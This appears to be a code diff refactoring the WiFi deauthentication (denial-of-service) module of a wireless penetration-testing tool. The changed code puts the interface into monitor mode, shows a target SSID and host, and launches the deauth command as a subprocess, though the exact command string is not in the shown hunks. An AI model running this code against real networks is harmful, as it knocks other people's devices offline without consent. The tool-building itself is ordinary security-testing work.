@@ -23,6 +23,8 @@ import interfaces.interfaces as interface
 import scanning.wifi.wpascan as wpascan
 import utils.utils as utils
 import subprocess
+import os
+import signal
 
 def wifi_dos(device):
     utils.header("WiFi DOS (Deauth) Attack","Configure WiFi Deauth Parameters")
@@ -43,8 +45,8 @@ def wifi_dos(device):
         utils.header("WiFi DOS (Deauth) Attack", "Note that configuration is set to Host Specific Mode mode and will target " + target_host.upper() + ".")
     else:
         utils.header("WiFi DOS (Deauth) Attack", "Note that configuration for WiFi Deauth Attack will be noisy.")
-
     utils.getch()
+
     target_descs = [
                 "Death Attack Target",
                 "SSID: " + target["essid"],
@@ -53,23 +55,33 @@ def wifi_dos(device):
                 "Host Specific Mode: " + str(not(target_host == "")),
                 "Target Host: " + target_host
             ]
-    if utils.yesNo("WiFi DOS (Deauth) Attack", target_descs, "Start Deauth Attack?", False):
+    if utils.yesNo("WiFi DOS (Deauth) Attack", target_descs, "Start Deauth Attack?", False):        
         utils.header("WiFi DOS (Deauth) Attack", "Deauth Attack Starting...")
-        process = deauth_wifi(target, device, target_host, target_host == "")
-        if process.poll() is None:
-            utils.header("WiFi DOS (Deauth) Attack", "Deauth Attack Ongoing...")
-            utils.getch("Press enter to end WiFi Deauth Attack...")
-            process.kill()
+        process_command = deauth_wifi_command(target, device, target_host, target_host == "")
+        
+        utils.header("Loading WiFi DOS attack...")
+        interface.terminate_services()
+        interface.enable_monitor(device, channel=target["channel"])
+        
+        process = subprocess.Popen(process_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+
+        utils.header("WiFi DOS (Deauth) Attack", ["Deauth Attack Ongoing...","Deauth PID: " + str(process.pid)])
+        utils.getch("Press enter to stop WiFi Deauth Attack...")
+        
+        process.kill()
+
+        #subprocess.Popen("ifconfig " + interface.get_logicalname(device) + " down", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).wait()
+        #subprocess.Popen("ifconfig " + interface.get_logicalname(device) + " up", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).wait()
+
+        interface.disable_monitor(device)
+        interface.restart_services()
     else:
         utils.header("WiFi DOS (Deauth) Attack", "Deauth Attack Cancelled!")
 
-def deauth_wifi(wifi:dict, device, host_macaddress:"", host_mode=False):
+#Returns deauth WiFi command to be executed.
+def deauth_wifi_command(wifi:dict, device, host_macaddress:"", host_mode=False):
     wifi_macaddress = wifi["bssid"]
     device_logicalname = interface.get_logicalname(device)
-
-    utils.header("Loading WiFi DOS attack...", "Activating Airmon-ng...")
-    interface.terminate_services()
-    interface.enable_mon(device, channel=wifi["channel"])
 
     utils.header("Loading WiFi DOS attack...", ["Airmon-ng active!","Loading deauth attack..."])
 
@@ -83,7 +95,4 @@ def deauth_wifi(wifi:dict, device, host_macaddress:"", host_mode=False):
         else:
             return None
 
-    return subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-
-def stop_deauth(process:subprocess):
-    process.kill()
+    return command
